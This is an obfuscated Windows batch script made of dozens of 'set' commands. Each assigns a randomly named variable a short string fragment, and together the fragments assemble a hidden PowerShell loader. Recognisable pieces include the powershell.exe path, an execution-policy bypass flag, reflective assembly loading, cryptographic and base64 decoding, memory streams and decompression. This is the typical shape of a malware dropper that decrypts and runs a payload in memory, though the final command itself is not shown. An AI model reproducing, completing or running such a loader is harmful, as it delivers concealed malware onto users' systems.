@echo off
set "ELjVoeUhfs=py"
set "JmlSreBXOs=rs"
set "kvTIYBSBMJ=.e"
set "hDbJxoAxhH=0\"
set "FVzHcKJPRL=1."
set "ZlhJxIBjmv=ll"
set "OetdNRLxHi=po"
set "CsLtirBZyL=y "
set "SmdrZPhXBv=rS"
set "HDTfqYFqHy=:\"
set "AVhdRNTacx=Po"
set "eDtUInUEMn=nd"
set "XIiMxdjYxc=Sy"
set "NuIwnBBvTk=he"
set "VytvMTLqPX=in"
set "HDGlHoRPdb=\v"
set "pNJouUQFEV=xe"
set "XDLGksbdDy=ll"
set "dseoRvJVMu=we"
set "usJpwfogTd=he"
set "LgrvTrytGz=ws"
set "wRFJWbSdFq=ow"
set "ebDtbuZDnM=st"
set "STFCmxahFL=\W"
set "CLANrGjNmD=co"
set "AoRVaejrhC= C"
set "zJktzxeBvI= /"
set "keWSXAcMOM=em"
set "yEAGfVbHhX=s\"
set "mEmkNchBiv=Wi"
set "lmwPqOJTlS=32"
set "bwjKQREOdn=do"
set "oycSxbeeEz=we"
set "NLexBkbVFk=cd"
set "enmzjHTzVr= %~dp0"
set "ZxYIufiBYQ=iron"
set "KcsmPZIgGB=YuOW"
set "KJqLELamwQ=YgkN"
set "bTgpBOirLc=bjec"
set "SlLuEBFDqQ=OHC."
set "WxXukjCKwx=DNJS"
set "ntzWAfBnlx=Syst"
set "DvumHYiATB=, (,"
set "UcbtcgfCtg= = ["
set "DASXrJjLrT=esaB"
set "aQjphlomAu=pher"
set "qnMVOgjtcf=HC.T"
set "RtukDcEbGG=orF'"
set "acCtSBhPMD=.Mem"
set "aJWYSRWnrU=n ''"
set "FAwzNogpoE=rtS4"
set "NbKjyKGqPz=R5jf"
set "ASleMrkjpt=gth)"
set "KXPaaMmhig=$Jfe"
set "xNQthILspI=ct S"
set "slIOwlrmlJ=.Cop"
set "NunwwLagHH=wxz "
set "MbvSHDXWKe== [S"
set "WSgpNbsTnb=Lymi"
set "JBRtSrZXTz=Ye.T"
set "nolNPNwSAh=-joi"
set "lqzbjDZFKi=gMod"
set "pYiTmghuAu=New-"
set "zBGDqdblRs=();$"
set "sIBbsfPLlp=g = "
set "GTRfzTeshI=-Obj"
set "lWRyoDozME=[Sys"
set "MPyLrLcryq=embl"
set "OHyqDKTekK=Conv"
set "YIqNVIGwag=join"
set "JrxsUspifc=raph"
set "XcPTtFcRCw=.Ass"
set "hkrGttXkIb=kYgk"
set "SGTmRtaaJl=ptor"
set "YWFgSixzZk=pStr"
set "mMRqOrkAKG=-4] "
set "sBEtrHiiut=THxh"
set "PQsjeoQUxS=xNY."
set "uHWGShORnx=1] -"
set "snSHuVRvHC=aDNK"
set "PdjClXHSpW=Syst"
set "gVUvXlfZRP='[-1"
set "YMpWLdOJxw= New"
set "TlWrzOrDCK=)($k"
set "hNLxRcdxFd=S46e"
set "IuHdUKycvO=1..-"
set "WSZZWukwbN=scgo"
set "HYPtJotfLX=  $m"
set "wqNGUZWmWt=ress"
set "dcbUAMXNBO=onve"
set "pusYOYlAKy=();$"
set "EnRlecBQUI=, $k"
set "fUOqIxwPCr=CM ="
set "vzeinDvupG=in $"
set "YCJLzWXkwl=em.I"
set "kvXuzAoURK=O.Pa"
set "QCwfxgzAal= [Sy"
set "NjCcVJCnUQ=.Dis"
set "UaQOpFGZQd=CuSj"
set "NmHzrDaxNO=flec"
set "mEqlESoyDO=Bmor"
set "HefhjTrzOJ=Os.D"
set "CkbYoJaNoT=esMa"
set "vRUoHmjRxT=Mode"
set "JrkuuYXIwm=Fina"
set "ybQYyyjayZ=oin "
set "WnvpKlsOXe=7kGw"
set "QUsiuwJeUc=$kYg"
set "PcotzjMCtD=Comp"
set "IUELxrnWdj=$SNF"
set "MyZuHOBBaR=xNY "
set "XQgUxtFFRP=GRxN"
set "POqWfXvVzk=Ye ="
set "sVaGsqEmHh=ewLi"
set "WGjkTgjDbn=y.Cr"
set "LLlruaJVBw=ion."
set "QTGvpkdokr=).Sp"
set "FmWMcnHmJt=ress"
set "ZefqfHHGBe=ct S"
set "hkHPDfoIDv==');"
set "KfFvGhrTtZ=bypa"
set "GIxgHmyXNL=)) {"
set "OsgcpwCdGd=yTo("
set "TVUAYOERMZ=y.Pa"
set "ODVbnGKIEf=lit("
set "ROdTGIRkZM=trea"
set "CxSgTlGjtf=ptog"
set "qKAiYfDXgt=$vsy"
set "YmgagnWdNA=6esa"
set "hiJyANiMOK=ose("
set "bVrIoqPBoQ=daeR"
set "SpZYuklDeZ=N, 0"
set "OfxNYKaYUl=::('"
set "ResXQZLwWa=kyhK"
set "hgjQchHOeX=vsyO"
